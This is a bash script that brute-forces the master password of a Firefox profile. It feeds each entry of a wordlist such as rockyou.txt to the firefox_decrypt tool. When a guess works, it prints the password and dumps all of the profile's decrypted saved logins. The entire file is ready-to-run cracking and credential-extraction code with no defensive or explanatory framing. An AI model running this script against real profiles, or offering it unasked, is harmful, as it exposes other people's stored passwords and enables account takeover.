#!/bin/bash
# Brute force Firefox master password
# Usage: ./firefox-brute.sh <password_file> <profile_path>
#
# Requires: firefox_decrypt installed (pip install firefox_decrypt)

set -e

PASSWORD_FILE="$1"
PROFILE_PATH="$2"

if [ -z "$PASSWORD_FILE" ] || [ -z "$PROFILE_PATH" ]; then
    echo "Usage: $0 <password_file> <profile_path>"
    echo "Example: $0 /usr/share/wordlists/rockyou.txt ~/.mozilla/firefox/abc123.default/"
    exit 1
fi

if [ ! -f "$PASSWORD_FILE" ]; then
    echo "Error: Password file not found: $PASSWORD_FILE"
    exit 1
fi

if [ ! -d "$PROFILE_PATH" ]; then
    echo "Error: Profile path not found: $PROFILE_PATH"
    exit 1
fi

if ! command -v firefox_decrypt &> /dev/null; then
    echo "Error: firefox_decrypt not installed"
    echo "Install with: pip install firefox_decrypt"
    exit 1
fi

echo "Starting Firefox master password brute force..."
echo "Profile: $PROFILE_PATH"
echo "Password file: $PASSWORD_FILE"
echo ""

while IFS= read -r pass || [ -n "$pass" ]; do
    # Skip empty lines and comments
    [[ -z "$pass" || "$pass" =~ ^# ]] && continue
    
    echo -n "Trying: $pass ... "
    
    # Try to decrypt with this password
    if echo "$pass" | firefox_decrypt --profile "$PROFILE_PATH" --master-password "$pass" > /dev/null 2>&1; then
        echo "SUCCESS!"
        echo ""
        echo "========================================"
        echo "Master password found: $pass"
        echo "========================================"
        echo ""
        echo "$pass" | firefox_decrypt --profile "$PROFILE_PATH" --master-password "$pass"
        exit 0
    else
        echo "failed"
    fi
done < "$PASSWORD_FILE"

echo ""
echo "No valid master password found in the provided list."
exit 1
